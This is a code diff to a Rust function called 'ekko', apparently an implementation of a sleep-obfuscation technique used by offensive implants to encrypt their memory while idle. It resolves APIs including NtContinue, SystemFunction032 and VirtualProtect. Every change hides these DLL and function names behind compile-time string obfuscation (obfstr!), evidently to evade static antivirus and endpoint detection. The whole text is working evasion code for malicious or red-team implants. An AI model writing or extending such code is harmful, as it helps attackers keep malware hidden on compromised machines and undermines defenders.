@@ -89,8 +89,8 @@ pub fn ekko(sleep_time: u32, key_buf: &mut Vec<u8>) {
 
     let rtl_capture_context = unsafe {
         GetProcAddress(
-            LoadLibraryA("ntdll\0".as_ptr()),
-            "RtlCaptureContext\0".as_ptr(),
+            LoadLibraryA(obfstr::obfstr!("ntdll\0").as_ptr()),
+            obfstr::obfstr!("RtlCaptureContext\0").as_ptr(),
         )
         .unwrap() as u64
     };
@@ -99,8 +99,8 @@ pub fn ekko(sleep_time: u32, key_buf: &mut Vec<u8>) {
 
     let nt_continue = unsafe {
         GetProcAddress(
-            GetModuleHandleA("ntdll\0".as_ptr()),
-            "NtContinue\0".as_ptr(),
+            GetModuleHandleA(obfstr::obfstr!("ntdll\0").as_ptr()),
+            obfstr::obfstr!("NtContinue\0").as_ptr(),
         )
         .unwrap() as u64
     };
@@ -108,29 +108,29 @@ pub fn ekko(sleep_time: u32, key_buf: &mut Vec<u8>) {
 
     let system_function032 = unsafe {
         GetProcAddress(
-            LoadLibraryA("Advapi32\0".as_ptr()),
-            "SystemFunction032\0".as_ptr(),
+            LoadLibraryA(obfstr::obfstr!("Advapi32\0").as_ptr()),
+            obfstr::obfstr!("SystemFunction032\0").as_ptr(),
         )
         .unwrap() as u64
     };
     let virtual_protect = unsafe {
         GetProcAddress(
-            LoadLibraryA("kernel32.dll\0".as_ptr()),
-            "VirtualProtect\0".as_ptr(),
+            LoadLibraryA(obfstr::obfstr!("kernel32.dll\0").as_ptr()),
+            obfstr::obfstr!("VirtualProtect\0").as_ptr(),
         )
         .unwrap() as u64
     };
     let wait_for_single_object = unsafe {
         GetProcAddress(
-            LoadLibraryA("kernel32.dll\0".as_ptr()),
-            "WaitForSingleObject\0".as_ptr(),
+            LoadLibraryA(obfstr::obfstr!("kernel32.dll\0").as_ptr()),
+            obfstr::obfstr!("WaitForSingleObject\0").as_ptr(),
         )
         .unwrap() as u64
     };
     let set_event = unsafe {
         GetProcAddress(
-            LoadLibraryA("kernel32.dll\0".as_ptr()),
-            "SetEvent\0".as_ptr(),
+            LoadLibraryA(obfstr::obfstr!("kernel32.dll\0").as_ptr()),
+            obfstr::obfstr!("SetEvent\0").as_ptr(),
         )
         .unwrap() as u64
     };
